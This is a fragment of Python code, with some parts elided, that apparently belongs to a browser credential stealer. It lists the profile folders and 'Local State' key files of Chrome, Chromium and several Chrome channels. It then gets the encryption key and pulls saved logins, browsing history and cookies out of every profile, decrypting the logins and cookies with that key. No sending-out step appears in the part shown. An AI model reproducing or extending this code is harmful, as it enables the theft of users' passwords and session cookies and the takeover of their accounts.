...
def getAllData():
    paths = [
        {
            ...
            "key": AppData + "\\Local\\Google\\Chrome\\User Data\\Local State"
        },
        {
            "profile": AppData + "\\Local\\Chromium\\User Data\\",
            "key": AppData + "\\Local\\Chromium\\User Data\\Local State"
        },
        {
            "profile": AppData + "\\Local\\Google\\Chrome Beta\\User Data\\",
            "key": AppData + "\\Local\\Google\\Chrome Beta\\User Data\\Local State"
        },
        {
            "profile": AppData + "\\Local\\Google\\Chrome SxS\\User Data\\",
            "key": AppData + "\\Local\\Google\\Chrome SxS\\User Data\\Local State"
        },
        {
            "profile": AppData + "\\Local\\Google\\Chrome Dev\\User Data\\",
            "key": AppData + "\\Local\\Google\\Chrome Dev\\User Data\\Local State"
        }
    ]
    ...
    for path in paths:
        ...
        curr_profiles = getProfiles(path["profile"])
        key = getEncKey(path["key"])

        for profile in curr_profiles:            
            profile["logins"] = [] if not profile["has_logins"] else getLogindata(profile["path"], key)
            profile["history"] = [] if not profile["has_history"] else getHistory(profile["path"])
            profile["cookies"] = [] if not profile["has_cookies"] else getCookies(profile["path"], key)
